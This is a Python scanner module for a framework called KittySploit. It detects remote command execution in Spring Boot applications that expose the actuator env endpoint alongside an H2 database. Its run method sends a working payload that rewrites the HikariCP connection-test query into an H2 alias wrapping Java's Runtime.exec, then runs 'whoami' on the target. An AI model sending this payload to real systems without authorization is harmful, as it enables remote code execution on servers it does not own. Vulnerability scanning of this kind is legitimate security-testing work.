#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Boot H2 Database is susceptible to remote code execution."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Boot H2 Database - Remote Command Execution Detection',
        'description': 'Spring Boot H2 Database is susceptible to remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'springboot', 'rce', 'jolokia', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database',
            'https://twitter.com/pyn3rd/status/1305151887964946432',
            'https://www.veracode.com/blog/research/exploiting-spring-boot-actuators',
            'https://github.com/spaceraccoon/spring-boot-actuator-h2-rce',
        ],
    }

    def run(self):
        path = '/actuator/env'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "name":"spring.datasource.hikari.connection-test-query",\n  "value":"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'whoami\');"\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Spring Boot H2 Database - Remote Command Execution detected', path=path)
            return True
        return False

